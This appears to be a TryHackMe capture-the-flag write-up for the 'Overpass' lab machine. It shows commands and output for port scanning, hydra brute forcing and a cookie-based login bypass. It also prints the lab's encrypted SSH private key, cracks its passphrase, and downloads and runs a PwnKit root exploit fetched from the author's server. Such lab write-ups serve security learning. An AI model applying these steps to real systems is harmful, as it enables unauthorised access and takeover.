# Overpass

URL: https://tryhackme.com/room/overpass

Level: Easy

Date: 17 July 2023

- [Recon](#recon)
	- [NMAP](#nmap)
	- [HTTP](#http)
	- [Feroxbuster](#feroxbuster)
	- [Admin page](#admin-page)
	- [Login Request](#login-request)
	- [SQLi attempt](#sqli-attempt)
	- [Users list](#userslist)
	- [Brute force attempt](#brute-force-attempt)
	- [Dive into js](#dive-into-js)
- [User Flag](#user-flag)
- [Privesc](#privesc)
	- [James password](#james-password)
	- [LinPeas](#linpeas)
	- [CVE-2021-4034](#cve-2021-4034)
	- [root flag](#root-flag)

## Recon

### nmap

```bash
$ sudo nmap -T4 -p- -n 10.10.97.170 -oA nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 08:41 CEST
Nmap scan report for 10.10.97.170
Host is up (0.062s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 40.02 seconds
```

```bash
$ sudo nmap -T4 -p- -n -sC -sV 10.10.97.170 -oA nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 08:43 CEST
Nmap scan report for 10.10.97.170
Host is up (0.063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37968598d1009c1463d9b03475b1f957 (RSA)
|   256 5375fac065daddb1e8dd40b8f6823924 (ECDSA)
|_  256 1c4ada1f36546da6c61700272e67759c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.92 seconds
```

### http

![](Pasted%20image%2020230717084451.png)

![](Pasted%20image%2020230717084510.png)

### feroxbuster

```bash
$ feroxbuster --silent -u http://10.10.97.170 -n -t 5 -L 1 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
http://10.10.97.170/
http://10.10.97.170/img => img/
http://10.10.97.170/downloads => downloads/
http://10.10.97.170/aboutus => aboutus/
http://10.10.97.170/admin => http://10.10.97.170/admin/
http://10.10.97.170/css => css/
http://10.10.97.170/http%3A%2F%2Fwww => http://10.10.97.170/http:/www
http://10.10.97.170/http%3A%2F%2Fyoutube => http://10.10.97.170/http:/youtube
http://10.10.97.170/http%3A%2F%2Fblogs => http://10.10.97.170/http:/blogs
http://10.10.97.170/http%3A%2F%2Fblog => http://10.10.97.170/http:/blog
http://10.10.97.170/**http%3A%2F%2Fwww => http://10.10.97.170/%2A%2Ahttp:/www
```

### admin page

![](Pasted%20image%2020230717085015.png)

### login request

```bash
POST /api/login HTTP/1.1
Host: 10.10.97.170
Content-Length: 29
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.10.97.170
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=admin&password=admin
```

### SQLi attempt

```bash
$ sqlmap -r login.req --batch
..
..
$ sqlmap -r login.req --batch --random-agent
..
..
[08:53:31] [WARNING] (custom) POST parameter '#1*' does not seem to be injectable
[08:53:31] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
```

### userslist

```html
$ curl -s http://10.10.97.170/aboutus/ |grep aboutText
            <p class="aboutText">Overpass was formed in 2020 by a group of Computer Science students who were
            <p class="aboutText">Ninja - Lead Developer</p>
            <p class="aboutText">Pars - Shibe Enthusiast and Emotional Support Animal Manager</p>
            <p class="aboutText">Szymex - Head Of Security</p>
            <p class="aboutText">Bee - Chief Drinking Water Coordinator</p>
            <p class="aboutText">MuirlandOracle - Cryptography Consultant</p>
```

```bash
$ curl -s http://10.10.97.170/aboutus/ |grep aboutText | awk -F ">" '{ print $2 }' |awk '{ print $1 }' | tr 'A-Z' 'a-z'
overpass
ninja
pars
szymex
bee
muirlandoracle
```

```bash
$ cat > userlist.txt
ninja
pars
szymex
bee
muirlandoracle
```

### brute force attempt

```bash
$ hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt 10.10.97.170 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Incorrect Credentials"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-17 09:12:01
[DATA] max 16 tasks per 1 server, overall 16 tasks, 71721995 login tries (l:5/p:14344399), ~4482625 tries per task
[DATA] attacking http-post-form://10.10.97.170:80/admin/index.php:user=^USER^&pass=^PASS^:Incorrect Credentials
[STATUS] 2215.00 tries/min, 2215 tries in 00:01h, 71719780 to do in 539:40h, 16 active
[STATUS] 2226.67 tries/min, 6680 tries in 00:03h, 71715315 to do in 536:48h, 16 active
[STATUS] 2241.86 tries/min, 15693 tries in 00:07h, 71706302 to do in 533:06h, 16 active
```

...no lock.

### dive into js

We look at JS source code and we find something interesting into `login.js`

```javascript
..
..
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

So, we manually set Cookie with `curl` :

```bash
$ curl -v http://10.10.77.112/admin/ -b "SessionToken=statusOrCookie"
*   Trying 10.10.77.112:80...
* Connected to 10.10.77.112 (10.10.77.112) port 80 (#0)
> GET /admin/ HTTP/1.1
> Host: 10.10.77.112
> User-Agent: curl/7.87.0
> Accept: */*
> Cookie: SessionToken=statusOrCookie
..
..
..
```

And we get an interesting response:

```html
..
..
                Also, we really need to talk about this "Military Grade" encryption. - Paradox</p>
            <pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----</pre>
        </div>
    </div>
</body>
..
..
```

Let's dump that SSH private key to a file:

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

Let's crack it with `John The Ripper`

```bash
$ ssh2john key > keyToCrack
$ cat keyToCrack
key:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea
..
..
```

```bash
joshua@kaligra:~/Documents/thm/overpass$ john --wordlist=/usr/share/wordlists/rockyou.txt keyToCrack
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (key)
1g 0:00:00:00 DONE (2023-07-18 19:28) 33.33g/s 445866p/s 445866c/s 445866C/s lisa..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We saw previously in HTML page that user should be `james`:

```html
..
..
<p>Since you keep forgetting your password, James, I've set up SSH keys for you.</p>
..
..
```

Let's try:

```bash
joshua@kaligra:~/Documents/thm/overpass$ chmod 400 key
joshua@kaligra:~/Documents/thm/overpass$ ssh -i key james@10.10.77.112
Enter passphrase for key 'key':
```

## user flag

```bash
$ ssh -i key james@10.10.77.112
Enter passphrase for key 'key':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jul 18 17:30:15 UTC 2023

  System load:  0.08               Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address for eth0: 10.10.77.112
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt
thm{65c1aaf000506e56996822cxxxxxx}
james@overpass-prod:~$

```

## privesc

We see a `todo.txt` file in our home directory:

```
$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

By looking on all files owned by `james`, we also found this:

```bash
$ find / -type f -user james -exec ls -ldb {} \; 2>/dev/null
..
..
..
-rw-r--r-- 1 james james 49 Jun 27  2020 /home/james/.overpass
james@overpass-prod:~$ cat .overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```

We need to figure out what encryption is used here.

We download stuff from `/downloads`, eg. the source code:

http://10.10.35.248/downloads/src/overpass.go

We read this:

```go
//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
func rot47(input string) string {
        var result []string
        for i := range input[:len(input)] {
                j := int(input[i])
                if (j >= 33) && (j <= 126) {
                        result = append(result, string(rune(33+((j+14)%94))))
                } else {
                        result = append(result, string(input[i]))
                }
        }
        return strings.Join(result, "")
}
```

So, probably rot47 is the encryption method used here.

Let's try with CyberChef:

https://gchq.github.io/CyberChef

### james password

We found James password:

```
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

### sudo attempt

```bash
james@overpass-prod:~$ sudo -l
[sudo] password for james:
Sorry, user james may not run sudo on overpass-prod.
james@overpass-prod:~$ crontab -l
no crontab for james
```

### linpeas

```bash
$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Looks like this system is vulnerable to:

```bash
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034
```


### CVE-2021-4034

```bash
james@overpass-prod:~$ wget http://10.8.100.14:8080/CVE-2021-403.tar.gz
--2023-07-20 06:53:15--  http://10.8.100.14:8080/CVE-2021-403.tar.gz
Connecting to 10.8.100.14:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 40683 (40K) [application/gzip]
Saving to: ‘CVE-2021-403.tar.gz’

CVE-2021-403.tar.gz                             100%[=====================================================================================================>]  39.73K  --.-KB/s    in 0.1s

2023-07-20 06:53:15 (349 KB/s) - ‘CVE-2021-403.tar.gz’ saved [40683/40683]
..
..
```

```bash
james@overpass-prod:~/CVE-2021-4034$ make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
james@overpass-prod:~/CVE-2021-4034$ ./cve-2021-4034
cve-2021-4034     cve-2021-4034.sh
james@overpass-prod:~/CVE-2021-4034$ ./cve-2021-4034
# id
uid=0(root) gid=0(root) groups=0(root),1001(james)
# cd
# ls
'GCONV_PATH=.'   LICENSE   Makefile   README.md   cve-2021-4034   cve-2021-4034.c   cve-2021-4034.sh   dry-run   gconv-modules   pwnkit.c   pwnkit.so
# cd /root
# ls
buildStatus  builds  go  root.txt  src

```

### root flag


```bash
# cat root.txt
thm{7f336f8c359dbac18d54fdd6XXXXXX}
#
```

